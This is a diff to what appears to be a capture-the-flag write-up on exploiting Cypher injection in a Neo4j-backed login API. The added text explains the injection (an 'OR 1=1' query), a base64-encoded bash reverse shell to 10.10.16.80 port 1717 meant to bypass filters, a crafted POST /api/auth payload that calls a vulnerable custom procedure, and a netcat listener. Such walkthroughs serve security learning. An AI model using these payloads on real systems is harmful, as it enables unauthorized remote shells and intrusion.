@@ -293,10 +293,23 @@ neo4j.exceptions.CypherSyntaxError: {code: Neo.ClientError.Statement.SyntaxError
  ^}
 ```
 
+We can see that the injection actually works, and our query looks like this
+
+```
+MATCH (u:USER)-[:SECRET]->(h:SHA1)
+WHERE u.name = 'injection' OR 1=1 //' return h.value as hash
+```
+
+Next we need to do the **base64** reverse shell
+
+The reverse shell is encoded in **Base64** to hide or bypass filters when sending the shell command through a vulnerable field. This makes the injection more inconspicuous, reliable, and resistant to quotes and special characters
+
 ```
 Hexada@hexada ~/app/vrm/cypher$ echo "bash -c 'exec bash -i &>/dev/tcp/10.10.16.80/1717 <&1'" | base64                                                                                     
 YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTYuODAvMTcxNyA8JjEnCg==
 ```
+
+We are ready to attack, our request should look like this
 
 ```
 POST /api/auth
@@ -309,6 +322,12 @@ Content-Type: application/json
 }
 
 ```
+
+`admin' OR 1=1` — breaks the syntax and makes the WHERE condition always true.
+
+`WITH 1 AS n` — ends the previous query block syntactically, allowing a new clause to start.
+
+`CALL custom.getUrlStatusCode(...)` — calls the vulnerable custom function, which executes our injected command.
 
 ```
 Hexada@hexada ~/app/vrm/cypher$ nc -lvnp 1717                                                                                                                                         1 ↵  
